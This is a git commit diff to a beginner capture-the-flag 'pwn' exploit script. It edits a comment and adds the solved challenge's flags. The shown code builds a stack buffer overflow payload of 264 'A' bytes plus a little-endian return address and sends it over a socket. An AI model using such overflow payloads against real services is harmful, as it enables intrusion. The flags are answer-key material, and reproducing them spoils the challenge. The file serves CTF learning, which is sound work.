7ea6be713cf9f38afca86a651c9d6f2c5e4e5cf7
saccharide <rtang@email.wm.edu>
2019-07-23 20:06:58 -0400

    Added flag

--- beginner/task6_pwn/xploit.py
+++ beginner/task6_pwn/xploit.py
@@ -24,7 +24,7 @@ print s.recv(4096)
 # Overflow the buffer with A's
 payload = 'A' * (256+8)  
 
-# Adding the desired memory address to return to
+# Adding the desired memory address to return to in little endian form
 payload += struct.pack('<q',0x0040085C)
 
 # Sending payload
@@ -32,3 +32,5 @@ s.send(payload + "\n")
 
 time.sleep(2)
 print s.recv(4096)
+
+# FLAG: CTF{controlled_crash_causes_conditional_correspondence} and CTF{Why_does_cauliflower_threaten_us}
